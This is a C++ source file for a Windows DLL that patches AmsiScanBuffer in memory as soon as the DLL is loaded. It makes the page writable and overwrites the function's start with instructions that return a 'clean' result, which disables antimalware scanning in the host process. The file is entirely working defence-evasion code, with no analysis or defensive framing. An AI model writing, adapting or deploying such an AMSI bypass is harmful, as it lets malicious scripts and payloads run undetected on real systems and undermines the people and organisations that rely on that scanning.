#include <windows.h>
#include "pch.h"
// Define AMSI_RESULT values if not already defined
#ifndef AMSI_RESULT
#define AMSI_RESULT_CLEAN 0
#endif

// Declaration of PatchAmsiScanBuffer function
void PatchAmsiScanBuffer();

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        PatchAmsiScanBuffer();
        DisableThreadLibraryCalls(hModule); // Optional: Disable DLL_THREAD_ATTACH and DLL_THREAD_DETACH calls for performance
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void PatchAmsiScanBuffer() {
    // Assume you know the exact address or can calculate it
    // For demonstration, the address needs to be dynamically found or hardcoded if known
    unsigned char* amsiScanBufferAddr = (unsigned char*)GetProcAddress(GetModuleHandle(L"amsi.dll"), "AmsiScanBuffer");
    if (amsiScanBufferAddr == nullptr) {
        OutputDebugString(L"Failed to find AmsiScanBuffer address.");
        return;
    }

    DWORD oldProtect;
    if (VirtualProtect(amsiScanBufferAddr, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        // Write the assembly code to move AMSI_RESULT_CLEAN into the EAX register (assuming x86 architecture) and return
        amsiScanBufferAddr[0] = 0xB8; // MOV EAX, immediate value
        *((unsigned int*)(amsiScanBufferAddr + 1)) = AMSI_RESULT_CLEAN; // Move AMSI_RESULT_CLEAN into EAX
        amsiScanBufferAddr[5] = 0xC3; // RET instruction

        // Restore the original page protection
        VirtualProtect(amsiScanBufferAddr, 16, oldProtect, &oldProtect);
        OutputDebugString(L"AmsiScanBuffer has been patched successfully.");
    }
    else {
        OutputDebugString(L"Failed to change memory protection.");
    }
} 
